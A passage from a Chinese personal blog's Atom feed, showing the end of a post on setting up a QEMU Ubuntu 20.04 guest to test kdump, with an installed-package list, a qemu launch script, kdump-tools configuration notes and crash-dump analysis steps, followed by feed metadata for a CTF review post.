class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br></pre></td><td class="code"><pre><span class="line">adduser/focal,now 3.118ubuntu2 all [installed]</span><br><span class="line">alsa-topology-conf/focal,now 1.2.2-1 all [installed,automatic]</span><br><span class="line">alsa-ucm-conf/focal-updates,now 1.2.2-1ubuntu0.13 all [installed,automatic]</span><br><span class="line">apport-symptoms/focal,now 0.23 all [installed,automatic]</span><br><span class="line">apport/focal-updates,now 2.20.11-0ubuntu27.27 all [installed,automatic]</span><br><span class="line">apt/focal-updates,now 2.0.10 amd64 [installed]</span><br><span class="line">base-files/focal-updates,now 11ubuntu5.8 amd64 [installed]</span><br><span class="line">base-passwd/focal,now 3.5.47 amd64 [installed]</span><br><span class="line">bash-completion/focal,now 1:2.10-1ubuntu1 all [installed]</span><br><span class="line">bash/focal-updates,focal-security,now 5.0-6ubuntu1.2 amd64 [installed]</span><br><span class="line">binutils-common/focal-updates,focal-security,now 2.34-6ubuntu1.10 amd64 [installed,automatic]</span><br><span class="line">binutils-x86-64-linux-gnu/focal-updates,focal-security,now 2.34-6ubuntu1.10 amd64 [installed,automatic]</span><br><span class="line">binutils/focal-updates,focal-security,now 2.34-6ubuntu1.10 amd64 [installed,automatic]</span><br><span class="line">bsdmainutils/focal,now 11.1.2ubuntu3 amd64 [installed,automatic]</span><br><span class="line">bsdutils/focal-updates,focal-security,now 1:2.34-0.1ubuntu9.6 amd64 [installed]</span><br><span class="line">busybox-initramfs/focal-updates,focal-security,now 1:1.30.1-4ubuntu6.5 amd64 [installed,automatic]</span><br><span class="line">bzip2/focal,now 1.0.8-2 amd64 [installed]</span><br><span class="line">ca-certificates/focal-updates,focal-security,now 20240203~20.04.1 all [installed,automatic]</span><br><span class="line">coreutils/focal,now 8.30-3ubuntu2 amd64 [installed]</span><br><span class="line">cpio/focal-updates,focal-security,now 2.13+dfsg-2ubuntu0.4 amd64 [installed,automatic]</span><br><span class="line">crash/focal-updates,now 7.2.8-1ubuntu1.20.04.1 amd64 [installed,automatic]</span><br><span class="line">dash/focal,now 0.5.10.2-6 amd64 [installed]</span><br><span class="line">dbus/focal-updates,focal-security,now 1.12.16-2ubuntu2.3 amd64 [installed,automatic]</span><br><span class="line">debconf/focal,now 1.5.73 all [installed]</span><br><span class="line">debianutils/focal,now 4.9.1 amd64 [installed]</span><br><span class="line">diffutils/focal,now 1:3.7-3 amd64 [installed]</span><br><span class="line">distro-info-data/focal-updates,now 0.43ubuntu1.17 all [installed,automatic]</span><br><span class="line">dmsetup/focal,now 2:1.02.167-1ubuntu1 amd64 [installed,automatic]</span><br><span class="line">dpkg/focal-updates,focal-security,now 1.19.7ubuntu3.2 amd64 [installed]</span><br><span class="line">e2fsprogs/focal-updates,now 1.45.5-2ubuntu1.2 amd64 [installed]</span><br><span class="line">fdisk/focal-updates,focal-security,now 2.34-0.1ubuntu9.6 amd64 [installed]</span><br><span class="line">file/focal,now 1:5.38-4 amd64 [installed,automatic]</span><br><span class="line">findutils/focal,now 4.7.0-1ubuntu1 amd64 [installed]</span><br><span class="line">gcc-10-base/focal-updates,focal-security,now 10.5.0-1ubuntu1~20.04 amd64 [installed]</span><br><span class="line">gettext-base/focal,now 0.19.8.1-10build1 amd64 [installed,automatic]</span><br><span class="line">gir1.2-glib-2.0/focal-updates,now 1.64.1-1~ubuntu20.04.1 amd64 [installed,automatic]</span><br><span class="line">gpgv/focal-updates,focal-security,now 2.2.19-3ubuntu2.2 amd64 [installed]</span><br><span class="line">grep/focal,now 3.4-1 amd64 [installed]</span><br><span class="line">grub-common/focal-updates,now 2.04-1ubuntu26.17 amd64 [installed,automatic]</span><br><span class="line">grub-gfxpayload-lists/focal,now 0.7 amd64 [installed,automatic]</span><br><span class="line">grub-pc-bin/focal-updates,now 2.04-1ubuntu26.17 amd64 [installed,automatic]</span><br><span class="line">grub-pc/focal-updates,now 2.04-1ubuntu26.17 amd64 [installed,automatic]</span><br><span class="line">grub2-common/focal-updates,now 2.04-1ubuntu26.17 amd64 [installed,automatic]</span><br><span class="line">gzip/focal-updates,focal-security,now 1.10-0ubuntu4.1 amd64 [installed]</span><br><span class="line">hostname/focal,now 3.23 amd64 [installed]</span><br><span class="line">init-system-helpers/focal,now 1.57 all [installed]</span><br><span class="line">init/focal,now 1.57 amd64 [installed]</span><br><span class="line">initramfs-tools-bin/focal-updates,now 0.136ubuntu6.7 amd64 [installed,automatic]</span><br><span class="line">initramfs-tools-core/focal-updates,now 0.136ubuntu6.7 all [installed,automatic]</span><br><span class="line">initramfs-tools/focal-updates,now 0.136ubuntu6.7 all [installed,automatic]</span><br><span class="line">iputils-ping/focal-updates,now 3:20190709-3ubuntu1 amd64 [installed]</span><br><span class="line">iso-codes/focal,now 4.4-1 all [installed,automatic]</span><br><span class="line">kdump-tools/focal-updates,now 1:1.6.7-1ubuntu2.5 amd64 [installed]</span><br><span class="line">kexec-tools/focal-updates,now 1:2.0.18-1ubuntu1.1 amd64 [installed]</span><br><span class="line">klibc-utils/focal-updates,focal-security,now 2.0.7-1ubuntu5.2 amd64 [installed,automatic]</span><br><span class="line">kmod/focal-updates,now 27-1ubuntu2.1 amd64 [installed,automatic]</span><br><span class="line">libacl1/focal,now 2.2.53-6 amd64 [installed]</span><br><span class="line">libapparmor1/focal-updates,focal-security,now 2.13.3-7ubuntu5.4 amd64 [installed,automatic]</span><br><span class="line">libapt-pkg6.0/focal-updates,now 2.0.10 amd64 [installed]</span><br><span class="line">libargon2-1/focal,now 0~20171227-0.2 amd64 [installed,automatic]</span><br><span class="line">libasound2-data/focal-updates,now 1.2.2-2.1ubuntu2.5 all [installed,automatic]</span><br><span class="line">libasound2/focal-updates,now 1.2.2-2.1ubuntu2.5 amd64 [installed,automatic]</span><br><span class="line">libattr1/focal,now 1:2.4.48-5 amd64 [installed]</span><br><span class="line">libaudit-common/focal,now 1:2.8.5-2ubuntu6 all [installed]</span><br><span class="line">libaudit1/focal,now 1:2.8.5-2ubuntu6 amd64 [installed]</span><br><span class="line">libbinutils/focal-updates,focal-security,now 2.34-6ubuntu1.10 amd64 [installed,automatic]</span><br><span class="line">libblkid1/focal-updates,focal-security,now 2.34-0.1ubuntu9.6 amd64 [installed]</span><br><span class="line">libbsd0/focal,now 0.10.0-1 amd64 [installed,automatic]</span><br><span class="line">libbz2-1.0/focal,now 1.0.8-2 amd64 [installed]</span><br><span class="line">libc-bin/focal-updates,focal-security,now 2.31-0ubuntu9.17 amd64 [installed]</span><br><span class="line">libc6/focal-updates,focal-security,now 2.31-0ubuntu9.17 amd64 [installed]</span><br><span class="line">libcanberra0/focal,now 0.30-7ubuntu1 amd64 [installed,automatic]</span><br><span class="line">libcap-ng0/focal,now 0.7.9-2.1build1 amd64 [installed]</span><br><span class="line">libcap2-bin/focal-updates,focal-security,now 1:2.32-1ubuntu0.2 amd64 [installed,automatic]</span><br><span class="line">libcap2/focal-updates,focal-security,now 1:2.32-1ubuntu0.2 amd64 [installed,automatic]</span><br><span class="line">libcom-err2/focal-updates,now 1.45.5-2ubuntu1.2 amd64 [installed]</span><br><span class="line">libcrypt1/focal,now 1:4.4.10-10ubuntu4 amd64 [installed]</span><br><span class="line">libcryptsetup12/focal-updates,focal-security,now 2:2.2.2-3ubuntu2.4 amd64 [installed,automatic]</span><br><span class="line">libctf-nobfd0/focal-updates,focal-security,now 2.34-6ubuntu1.10 amd64 [installed,automatic]</span><br><span class="line">libctf0/focal-updates,focal-security,now 2.34-6ubuntu1.10 amd64 [installed,automatic]</span><br><span class="line">libdb5.3/focal,now 5.3.28+dfsg1-0.6ubuntu2 amd64 [installed]</span><br><span class="line">libdbus-1-3/focal-updates,focal-security,now 1.12.16-2ubuntu2.3 amd64 [installed,automatic]</span><br><span class="line">libdebconfclient0/focal,now 0.251ubuntu1 amd64 [installed]</span><br><span class="line">libdevmapper1.02.1/focal,now 2:1.02.167-1ubuntu1 amd64 [installed,automatic]</span><br><span class="line">libdw1/focal-updates,focal-security,now 0.176-1.1ubuntu0.1 amd64 [installed,automatic]</span><br><span class="line">libefiboot1/focal-updates,now 37-2ubuntu2.2 amd64 [installed,automatic]</span><br><span class="line">libefivar1/focal-updates,now 37-2ubuntu2.2 amd64 [installed,automatic]</span><br><span class="line">libelf1/focal-updates,focal-security,now 0.176-1.1ubuntu0.1 amd64 [installed,automatic]</span><br><span class="line">libexpat1/focal-updates,focal-security,now 2.2.9-1ubuntu0.8 amd64 [installed,automatic]</span><br><span class="line">libext2fs2/focal-updates,now 1.45.5-2ubuntu1.2 amd64 [installed]</span><br><span class="line">libfdisk1/focal-updates,focal-security,now 2.34-0.1ubuntu9.6 amd64 [installed]</span><br><span class="line">libffi7/focal,now 3.3-4 amd64 [installed]</span><br><span class="line">libfreetype6/focal-updates,focal-security,now 2.10.1-2ubuntu0.4 amd64 [installed,automatic]</span><br><span class="line">libfuse2/focal,now 2.9.9-3 amd64 [installed,automatic]</span><br><span class="line">libgcc-s1/focal-updates,focal-security,now 10.5.0-1ubuntu1~20.04 amd64 [installed]</span><br><span class="line">libgcrypt20/focal-updates,focal-security,now 1.8.5-5ubuntu1.1 amd64 [installed]</span><br><span class="line">libgdbm-compat4/focal,now 1.18.1-5 amd64 [installed,automatic]</span><br><span class="line">libgdbm6/focal,now 1.18.1-5 amd64 [installed,automatic]</span><br><span class="line">libgirepository-1.0-1/focal-updates,now 1.64.1-1~ubuntu20.04.1 amd64 [installed,automatic]</span><br><span class="line">libglib2.0-0/focal-updates,focal-security,now 2.64.6-1~ubuntu20.04.8 amd64 [installed,automatic]</span><br><span class="line">libglib2.0-data/focal-updates,focal-security,now 2.64.6-1~ubuntu20.04.8 all [installed,automatic]</span><br><span class="line">libgmp10/focal-updates,focal-security,now 2:6.2.0+dfsg-4ubuntu0.1 amd64 [installed]</span><br><span class="line">libgnutls30/focal-updates,focal-security,now 3.6.13-2ubuntu1.12 amd64 [installed]</span><br><span class="line">libgpg-error0/focal,now 1.37-1 amd64 [installed]</span><br><span class="line">libgpm2/focal,now 1.20.7-5 amd64 [installed,automatic]</span><br><span class="line">libhogweed5/focal-updates,focal-security,now 3.5.1+really3.5.1-2ubuntu0.2 amd64 [installed]</span><br><span class="line">libicu66/focal-updates,focal-security,now 66.1-2ubuntu2.1 amd64 [installed,automatic]</span><br><span class="line">libidn2-0/focal,now 2.2.0-2 amd64 [installed]</span><br><span class="line">libip4tc2/focal-updates,now 1.8.4-3ubuntu2.1 amd64 [installed,automatic]</span><br><span class="line">libjson-c4/focal-updates,focal-security,now 0.13.1+dfsg-7ubuntu0.3 amd64 [installed,automatic]</span><br><span class="line">libklibc/focal-updates,focal-security,now 2.0.7-1ubuntu5.2 amd64 [installed,automatic]</span><br><span class="line">libkmod2/focal-updates,now 27-1ubuntu2.1 amd64 [installed,automatic]</span><br><span class="line">libltdl7/focal,now 2.4.6-14 amd64 [installed,automatic]</span><br><span class="line">liblz4-1/focal-updates,focal-security,now 1.9.2-2ubuntu0.20.04.1 amd64 [installed]</span><br><span class="line">liblzma5/focal-updates,focal-security,now 5.2.4-1ubuntu1.1 amd64 [installed]</span><br><span class="line">liblzo2-2/focal,now 2.10-2 amd64 [installed,automatic]</span><br><span class="line">libmagic-mgc/focal,now 1:5.38-4 amd64 [installed,automatic]</span><br><span class="line">libmagic1/focal,now 1:5.38-4 amd64 [installed,automatic]</span><br><span class="line">libmount1/focal-updates,focal-security,now 2.34-0.1ubuntu9.6 amd64 [installed]</span><br><span class="line">libmpdec2/focal,now 2.4.2-3 amd64 [installed,automatic]</span><br><span class="line">libncurses6/focal-updates,focal-security,now 6.2-0ubuntu2.1 amd64 [installed]</span><br><span class="line">libncursesw6/focal-updates,focal-security,now 6.2-0ubuntu2.1 amd64 [installed]</span><br><span class="line">libnettle7/focal-updates,focal-security,now 3.5.1+really3.5.1-2ubuntu0.2 amd64 [installed]</span><br><span class="line">libnss-systemd/focal-updates,now 245.4-4ubuntu3.24 amd64 [installed,automatic]</span><br><span class="line">libogg0/focal,now 1.3.4-0ubuntu1 amd64 [installed,automatic]</span><br><span class="line">libp11-kit0/focal-updates,focal-security,now 0.23.20-1ubuntu0.1 amd64 [installed]</span><br><span class="line">libpam-cap/focal-updates,focal-security,now 1:2.32-1ubuntu0.2 amd64 [installed,automatic]</span><br><span class="line">libpam-modules-bin/focal-updates,focal-security,now 1.3.1-5ubuntu4.7 amd64 [installed]</span><br><span class="line">libpam-modules/focal-updates,focal-security,now 1.3.1-5ubuntu4.7 amd64 [installed]</span><br><span class="line">libpam-runtime/focal-updates,focal-security,now 1.3.1-5ubuntu4.7 all [installed]</span><br><span class="line">libpam-systemd/focal-updates,now 245.4-4ubuntu3.24 amd64 [installed,automatic]</span><br><span class="line">libpam0g/focal-updates,focal-security,now 1.3.1-5ubuntu4.7 amd64 [installed]</span><br><span class="line">libpcre2-8-0/focal-updates,focal-security,now 10.34-7ubuntu0.1 amd64 [installed]</span><br><span class="line">libpcre3/focal-updates,focal-security,now 2:8.39-12ubuntu0.1 amd64 [installed]</span><br><span class="line">libperl5.30/focal-updates,focal-security,now 5.30.0-9ubuntu0.5 amd64 [installed,automatic]</span><br><span class="line">libpng16-16/focal,now 1.6.37-2 amd64 [installed,automatic]</span><br><span class="line">libprocps8/focal-updates,focal-security,now 2:3.3.16-1ubuntu2.4 amd64 [installed]</span><br><span class="line">libpython3-stdlib/focal,now 3.8.2-0ubuntu2 amd64 [installed,automatic]</span><br><span class="line">libpython3.8-minimal/focal-updates,focal-security,now 3.8.10-0ubuntu1~20.04.17 amd64 [installed,automatic]</span><br><span class="line">libpython3.8-stdlib/focal-updates,focal-security,now 3.8.10-0ubuntu1~20.04.17 amd64 [installed,automatic]</span><br><span class="line">libpython3.8/focal-updates,focal-security,now 3.8.10-0ubuntu1~20.04.17 amd64 [installed,automatic]</span><br><span class="line">libreadline8/focal,now 8.0-4 amd64 [installed,automatic]</span><br><span class="line">libseccomp2/focal-updates,focal-security,now 2.5.1-1ubuntu1~20.04.2 amd64 [installed]</span><br><span class="line">libselinux1/focal,now 3.0-1build2 amd64 [installed]</span><br><span class="line">libsemanage-common/focal,now 3.0-1build2 all [installed]</span><br><span class="line">libsemanage1/focal,now 3.0-1build2 amd64 [installed]</span><br><span class="line">libsepol1/focal-updates,focal-security,now 3.0-1ubuntu0.1 amd64 [installed]</span><br><span class="line">libsmartcols1/focal-updates,focal-security,now 2.34-0.1ubuntu9.6 amd64 [installed]</span><br><span class="line">libsnappy1v5/focal,now 1.1.8-1build1 amd64 [installed,automatic]</span><br><span class="line">libsqlite3-0/focal-updates,focal-security,now 3.31.1-4ubuntu0.6 amd64 [installed,automatic]</span><br><span class="line">libss2/focal-updates,now 1.45.5-2ubuntu1.2 amd64 [installed]</span><br><span class="line">libssl1.1/focal-updates,focal-security,now 1.1.1f-1ubuntu2.24 amd64 [installed,automatic]</span><br><span class="line">libstdc++6/focal-updates,focal-security,now 10.5.0-1ubuntu1~20.04 amd64 [installed]</span><br><span class="line">libsystemd0/focal-updates,now 245.4-4ubuntu3.24 amd64 [installed]</span><br><span class="line">libtasn1-6/focal-updates,focal-security,now 4.16.0-2ubuntu0.1 amd64 [installed]</span><br><span class="line">libtdb1/focal-updates,focal-security,now 1.4.5-0ubuntu0.20.04.1 amd64 [installed,automatic]</span><br><span class="line">libtinfo6/focal-updates,focal-security,now 6.2-0ubuntu2.1 amd64 [installed]</span><br><span class="line">libudev1/focal-updates,now 245.4-4ubuntu3.24 amd64 [installed]</span><br><span class="line">libunistring2/focal,now 0.9.10-2 amd64 [installed]</span><br><span class="line">libuuid1/focal-updates,focal-security,now 2.34-0.1ubuntu9.6 amd64 [installed]</span><br><span class="line">libvorbis0a/focal,now 1.3.6-2ubuntu1 amd64 [installed,automatic]</span><br><span class="line">libvorbisfile3/focal,now 1.3.6-2ubuntu1 amd64 [installed,automatic]</span><br><span class="line">libxml2/focal-updates,focal-security,now 2.9.10+dfsg-5ubuntu0.20.04.9 amd64 [installed,automatic]</span><br><span class="line">libzstd1/focal-updates,focal-security,now 1.4.4+dfsg-3ubuntu0.1 amd64 [installed]</span><br><span class="line">linux-base/focal-updates,now 4.5ubuntu3.7 all [installed,automatic]</span><br><span class="line">linux-crashdump/focal-updates,focal-security,now 5.4.0.208.204 amd64 [installed]</span><br><span class="line">linux-image-5.4.0-1127-kvm/focal-updates,focal-security,now 5.4.0-1127.136 amd64 [installed,automatic]</span><br><span class="line">linux-modules-5.4.0-1127-kvm/focal-updates,focal-security,now 5.4.0-1127.136 amd64 [installed,automatic]</span><br><span class="line">locales/focal-updates,focal-security,now 2.31-0ubuntu9.17 all [installed]</span><br><span class="line">login/focal-updates,focal-security,now 1:4.8.1-1ubuntu5.20.04.5 amd64 [installed]</span><br><span class="line">logsave/focal-updates,now 1.45.5-2ubuntu1.2 amd64 [installed]</span><br><span class="line">lsb-base/focal,now 11.1.0ubuntu2 all [installed]</span><br><span class="line">lsb-release/focal,now 11.1.0ubuntu2 all [installed,automatic]</span><br><span class="line">lz4/focal-updates,focal-security,now 1.9.2-2ubuntu0.20.04.1 amd64 [installed,automatic]</span><br><span class="line">makedumpfile/focal-updates,now 1:1.6.7-1ubuntu2.5 amd64 [installed,automatic]</span><br><span class="line">mawk/focal,now 1.3.4.20200120-2 amd64 [installed]</span><br><span class="line">mime-support/focal,now 3.64ubuntu1 all [installed,automatic]</span><br><span class="line">mount/focal-updates,focal-security,now 2.34-0.1ubuntu9.6 amd64 [installed]</span><br><span class="line">ncurses-base/focal-updates,focal-security,now 6.2-0ubuntu2.1 all [installed]</span><br><span class="line">ncurses-bin/focal-updates,focal-security,now 6.2-0ubuntu2.1 amd64 [installed]</span><br><span class="line">netbase/focal,now 6.1 all [installed,automatic]</span><br><span class="line">networkd-dispatcher/focal-updates,focal-security,now 2.1-2~ubuntu20.04.3 all [installed,automatic]</span><br><span class="line">openssl/focal-updates,focal-security,now 1.1.1f-1ubuntu2.24 amd64 [installed,automatic]</span><br><span class="line">os-prober/focal,now 1.74ubuntu2 amd64 [installed,automatic]</span><br><span class="line">passwd/focal-updates,focal-security,now 1:4.8.1-1ubuntu5.20.04.5 amd64 [installed]</span><br><span class="line">perl-base/focal-updates,focal-security,now 5.30.0-9ubuntu0.5 amd64 [installed]</span><br><span class="line">perl-modules-5.30/focal-updates,focal-security,now 5.30.0-9ubuntu0.5 all [installed,automatic]</span><br><span class="line">perl/focal-updates,focal-security,now 5.30.0-9ubuntu0.5 amd64 [installed,automatic]</span><br><span class="line">procps/focal-updates,focal-security,now 2:3.3.16-1ubuntu2.4 amd64 [installed]</span><br><span class="line">python-apt-common/focal-updates,now 2.0.1ubuntu0.20.04.1 all [installed,automatic]</span><br><span class="line">python3-apport/focal-updates,now 2.20.11-0ubuntu27.27 all [installed,automatic]</span><br><span class="line">python3-apt/focal-updates,now 2.0.1ubuntu0.20.04.1 amd64 [installed,automatic]</span><br><span class="line">python3-blinker/focal,now 1.4+dfsg1-0.3ubuntu1 all [installed,automatic]</span><br><span class="line">python3-certifi/focal,now 2019.11.28-1 all [installed,automatic]</span><br><span class="line">python3-cffi-backend/focal,now 1.14.0-1build1 amd64 [installed,automatic]</span><br><span class="line">python3-chardet/focal,now 3.0.4-4build1 all [installed,automatic]</span><br><span class="line">python3-cryptography/focal-updates,focal-security,now 2.8-3ubuntu0.3 amd64 [installed,automatic]</span><br><span class="line">python3-dbus/focal,now 1.2.16-1build1 amd64 [installed,automatic]</span><br><span class="line">python3-distro/focal,now 1.4.0-1 all [installed,automatic]</span><br><span class="line">python3-entrypoints/focal,now 0.3-2ubuntu1 all [installed,automatic]</span><br><span class="line">python3-gi/focal,now 3.36.0-1 amd64 [installed,automatic]</span><br><span class="line">python3-httplib2/focal,now 0.14.0-1ubuntu1 all [installed,automatic]</span><br><span class="line">python3-idna/focal-updates,focal-security,now 2.8-1ubuntu0.1 all [installed,automatic]</span><br><span class="line">python3-jwt/focal-updates,focal-security,now 1.7.1-2ubuntu2.1 all [installed,automatic]</span><br><span class="line">python3-keyring/focal,now 18.0.1-2ubuntu1 all [installed,automatic]</span><br><span class="line">python3-launchpadlib/focal,now 1.10.13-1 all [installed,automatic]</span><br><span class="line">python3-lazr.restfulclient/focal,now 0.14.2-2build1 all [installed,automatic]</span><br><span class="line">python3-lazr.uri/focal,now 1.0.3-4build1 all [installed,automatic]</span><br><span class="line">python3-minimal/focal,now 3.8.2-0ubuntu2 amd64 [installed,automatic]</span><br><span class="line">python3-oauthlib/focal,now 3.1.0-1ubuntu2 all [installed,automatic]</span><br><span class="line">python3-pkg-resources/focal-updates,focal-security,now 45.2.0-1ubuntu0.2 all [installed,automatic]</span><br><span class="line">python3-problem-report/focal-updates,now 2.20.11-0ubuntu27.27 all [installed,automatic]</span><br><span class="line">python3-requests-unixsocket/focal,now 0.2.0-2 all [installed,automatic]</span><br><span class="line">python3-requests/focal-updates,focal-security,now 2.22.0-2ubuntu1.1 all [installed,automatic]</span><br><span class="line">python3-secretstorage/focal,now 2.3.1-2ubuntu1 all [installed,automatic]</span><br><span class="line">python3-simplejson/focal,now 3.16.0-2ubuntu2 amd64 [installed,automatic]</span><br><span class="line">python3-six/focal,now 1.14.0-2 all [installed,automatic]</span><br><span class="line">python3-systemd/focal,now 234-3build2 amd64 [installed,automatic]</span><br><span class="line">python3-urllib3/focal-updates,focal-security,now 1.25.8-2ubuntu0.4 all [installed,automatic]</span><br><span class="line">python3-wadllib/focal,now 1.3.3-3build1 all [installed,automatic]</span><br><span class="line">python3.8-minimal/focal-updates,focal-security,now 3.8.10-0ubuntu1~20.04.17 amd64 [installed,automatic]</span><br><span class="line">python3.8/focal-updates,focal-security,now 3.8.10-0ubuntu1~20.04.17 amd64 [installed,automatic]</span><br><span class="line">python3/focal,now 3.8.2-0ubuntu2 amd64 [installed,automatic]</span><br><span class="line">readline-common/focal,now 8.0-4 all [installed,automatic]</span><br><span class="line">sed/focal,now 4.7-1 amd64 [installed]</span><br><span class="line">sensible-utils/focal,now 0.0.12+nmu1 all [installed]</span><br><span class="line">shared-mime-info/focal,now 1.15-1 amd64 [installed,automatic]</span><br><span class="line">sound-theme-freedesktop/focal,now 0.8-2ubuntu1 all [installed,automatic]</span><br><span class="line">systemd-sysv/focal-updates,now 245.4-4ubuntu3.24 amd64 [installed,automatic]</span><br><span class="line">systemd-timesyncd/focal-updates,now 245.4-4ubuntu3.24 amd64 [installed,automatic]</span><br><span class="line">systemd/focal-updates,now 245.4-4ubuntu3.24 amd64 [installed]</span><br><span class="line">sysvinit-utils/focal,now 2.96-2.1ubuntu1 amd64 [installed]</span><br><span class="line">tar/focal-updates,focal-security,now 1.30+dfsg-7ubuntu0.20.04.4 amd64 [installed]</span><br><span class="line">tzdata/focal-updates,focal-security,now 2024b-0ubuntu0.20.04.1 all [installed,automatic]</span><br><span class="line">ubuntu-keyring/focal-updates,now 2020.02.11.4 all [installed]</span><br><span class="line">ucf/focal,now 3.0038+nmu1 all [installed,automatic]</span><br><span class="line">udev/focal-updates,now 245.4-4ubuntu3.24 amd64 [installed,automatic]</span><br><span class="line">util-linux/focal-updates,focal-security,now 2.34-0.1ubuntu9.6 amd64 [installed]</span><br><span class="line">vim-common/focal-updates,focal-security,now 2:8.1.2269-1ubuntu5.31 all [installed,automatic]</span><br><span class="line">vim-runtime/focal-updates,focal-security,now 2:8.1.2269-1ubuntu5.31 all [installed,automatic]</span><br><span class="line">vim/focal-updates,focal-security,now 2:8.1.2269-1ubuntu5.31 amd64 [installed]</span><br><span class="line">xdg-user-dirs/focal,now 0.17-2ubuntu1 amd64 [installed,automatic]</span><br><span class="line">xxd/focal-updates,focal-security,now 2:8.1.2269-1ubuntu5.31 amd64 [installed,automatic]</span><br><span class="line">xz-utils/focal-updates,focal-security,now 5.2.4-1ubuntu1.1 amd64 [installed,automatic]</span><br><span class="line">zlib1g/focal-updates,focal-security,now 1:1.2.11.dfsg-2ubuntu1.5 amd64 [installed]</span><br></pre></td></tr></table></figure><h1>3. kdump</h1><p>umount后qemu启动进去。我的qemu的启动脚本如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64 -m 1G\</span><br><span class="line">-append &quot;nokaslr console=ttyS0 root=/dev/sda earlyprintk=serial rw loglevel=8 crashkernel=256M&quot; \</span><br><span class="line">-kernel linux-6.13.7/arch/x86/boot/bzImage \</span><br><span class="line">    -drive file=newrootfs.img,format=raw \</span><br><span class="line">-nographic \</span><br><span class="line">    -smp 1 \</span><br><span class="line">    -enable-kvm \</span><br><span class="line">    -netdev user,id=mynic0 -device e1000,netdev=mynic0,mac=52:54:98:76:54:32 \</span><br><span class="line">    -pidfile vm.pid \</span><br><span class="line">    2&gt;&amp;1 | tee vm.log</span><br></pre></td></tr></table></figure><p>其中，kexec要想运行，内核参数需要传入crashkernel。同时要提供rw参数让系统能够写入镜像。如果一切顺利，你这时会在systemd的启动日志中看到kdump相关的输出，当然这里我们还没有配置所以应该是失败。</p><p>kdump默认会从<code>/var/lib/kdump</code>目录下面查找initrd和vmlinuz符号链接，我们用qemu起的内核当然是没有的。其配置文件位于<code>/etc/default/kdump-tools</code>，只需要编辑这个文件修改路径即可。刚刚chroot的时候copy内核vmlinuz和initrd进去，并在配置文件中指明他们的路径。你也可以配置自己的makedumpfile和kexec参数。</p><p>kdump提供了命令<code>kdump-config</code>，用status或者show可以看到一些信息。如果是ready to kdump，那么就可以尝试用<code>echo c &gt; /proc/sysrq-trigger</code>触发内核崩溃了。在我用的ubuntubase上这个默认是开启的，如果没有开启可以自行查找开启方法，写一个1就行。一切顺利的话，kdump会自动触发内核重启，并在/var/crash下留下一个以时间命名的文件夹，里面包含有dmesg和压缩后的内核的内存转储（默认是只保留内核空间正在使用的页框）。然后用crash选定带调试信息的内核（也就是qemu启动参数指定的内核，选根目录的vmlinux），就可以查看转储分析了。</p><h1>总结</h1><p>这次从0开始，相当于是借助qemu从0搭了个linux机器。中间遇到各种各样的问题，包括systemd的服务报错，机器关不了，崩溃了不重启，停在initramfs进不去，vmcore有了分析不了一直报错等等…留个归档</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;OS比赛的环境搭建折磨了我两天，因此有必要在这里记录下全过程，以后自己想用什么系统也会方便一点。而且网上的blog对于坑是只字不提啊我日。&lt;/p&gt;
&lt;p&gt;目前能够完美运行kdump的环境，基于：&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;</summary>
      
    
    
    
    <category term="kernel" scheme="https://zjw1nd.github.io/categories/kernel/"/>
    
    
    <category term="linux" scheme="https://zjw1nd.github.io/tags/linux/"/>
    
    <category term="kernel" scheme="https://zjw1nd.github.io/tags/kernel/"/>
    
    <category term="kdump" scheme="https://zjw1nd.github.io/tags/kdump/"/>
    
  </entry>
  
  <entry>
    <title>2025ciscnccb复盘小记</title>
    <link href="https://zjw1nd.github.io/2025/03/17/2025ciscnccb%E5%A4%8D%E7%9B%98%E5%B0%8F%E8%AE%B0/"/>
    <id>https://zjw1nd.github.io/2025/03/17/2025ciscnccb%E5%A4%8D%E7%9B%98%E5%B0%8F%E8%AE%B0/</id>
    <published>2025-03-17T14:28:55.000Z</published>
    <updated>2025-03-20T03:03:22.971Z</updated>
    
